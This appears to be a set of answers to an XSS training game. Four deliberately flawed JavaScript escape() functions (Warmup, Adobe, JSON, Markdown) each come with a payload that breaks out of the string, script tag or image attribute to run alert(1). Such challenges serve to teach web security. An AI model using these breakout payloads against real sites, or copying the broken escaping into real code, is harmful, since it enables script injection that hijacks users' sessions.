// Warmup
function escape(s) {
    return '<script>console.log("' + s + '");</script>';
}
```
"); alert(1);  console.log("
```

// Adobe
function escape(s) {
    s = s.replace(/"/g, '\\"');
    return '<script>console.log("' + s + '");</script>';
}
```
\\\"); alert(1);  </script>"
```

// JSON
function escape(s) {
    s = JSON.stringify(s);
    return '<script>console.log(' + s + ');</script>';
}
// https://pragmaticwebsecurity.com/articles/spasecurity/json-stringify-xss.html
```
"content":"</script><script>alert(1)</script>"
```

// Markdown
function escape(s) {
    var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
    // URLs
    text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
    // [[img123|Description]]
    text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
    return text;
}
```
[[a | http://onerror=alert(1)//]]
```